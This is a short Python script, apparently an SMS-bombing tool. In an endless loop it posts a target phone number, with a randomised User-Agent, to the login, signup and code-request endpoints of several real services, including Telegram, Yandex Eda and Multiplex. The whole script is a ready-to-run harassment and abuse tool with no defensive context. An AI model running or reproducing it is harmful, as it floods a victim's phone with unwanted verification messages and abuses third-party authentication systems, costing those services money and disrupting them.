from user_agent import generate_user_agent
import requests

phone = ''
phone_plus = '+' + phone

while True:	
	head = {'User-Agent': generate_user_agent(), 'X-Requested-With': 'XMLHttpRequest'}
	
	response = requests.post('https://auth.multiplex.ua/login', json = {'login': phone}, headers = head)
	print('Multiplex: ' + str(response.text))
	
	response = requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json = {'phone_number': phone_plus}, headers = head)
	print('Yandex eda: ' + str(response.text))

	response = requests.post('https://md-fashion.com.ua/bpm/validate-contact', data = {'phone': phone_plus}, headers = head)
	print('MD Fashion: ' + str(response.text))

	response = requests.post('https://my.telegram.org/auth/send_password', data = {'phone': phone_plus}, headers = head)
	print('Telegram: ' + str(response.text))

	response = requests.post('https://taxovichkof.ru/api/userSendSms', data = {'username': phone_plus, 'lang': 'ru', 'city': 'spb'}, headers = head)
	print('Taxovichkof: ' + str(response.text))

	response = requests.post('https://my.xtra.tv/api/signup?lang=uk', data = {'phone': phone_plus}, headers = head)
	print('XTRA TV: ' + str(response.text))

	response = requests.get('https://findclone.ru/register', data = {'phone': phone}, headers = head)
	print('FindClone: ' + str(response.text))